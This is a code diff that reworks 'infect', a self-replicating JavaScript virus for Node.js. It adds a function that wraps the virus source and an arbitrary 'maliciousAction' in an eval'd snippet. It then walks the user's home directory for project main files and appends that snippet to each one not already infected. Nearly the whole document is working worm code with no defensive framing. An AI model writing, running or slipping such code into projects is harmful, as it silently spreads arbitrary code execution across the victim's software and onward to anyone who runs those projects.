@@ -1,20 +1,22 @@
-global.infect = function( payload ) { 
+function infect( maliciousAction, virusSrc ) { 
 
     const fs   = require( "fs" );
     const os   = require( "os" );
     const path = require( "path" );
 
-    function escape(str) {
-        return str.replace(/[\\"]/g, "\\$&");
+    function getCopyOfVirus( maliciousAction, virusSrc ) {
+        function escape( str ) {
+            return str.replace(/[\\"]/g, "\\$&");
+        }
+        return `
+            (function() {
+                var maliciousAction = "${escape(maliciousAction)}";
+                var virusSrc = "${escape(virusSrc)}";
+                var fn = eval( virusSrc );
+                fn( maliciousAction, virusSrc );
+            })();
+        `;
     }
-
-    const modifiedPayload = `
-(function() {
-    var payload = "${escape(payload)}";
-    eval(payload);
-    global.infect( payload );
-})();
-    `;
 
     function readdir( dir ) {
         return new Promise( function( rs, rj ) {
@@ -105,14 +107,15 @@ global.infect = function( payload ) {
             });
     }
 
+    var virus = getCopyOfVirus( maliciousAction, virusSrc );
+
     getProjectMains( os.homedir(), 10 ).then( function( files ) {
         return Promise.all( files.map( function( file ) {
             readFile( file )
                 .then( function( data ) {
-                    if( data.indexOf( modifiedPayload ) === -1 )
-                        return appendFile( file, modifiedPayload );
+                    if( data.indexOf( virus ) === -1 )
+                        return appendFile( file, virus );
                 }); 
         }));
     });
-};
-
+}
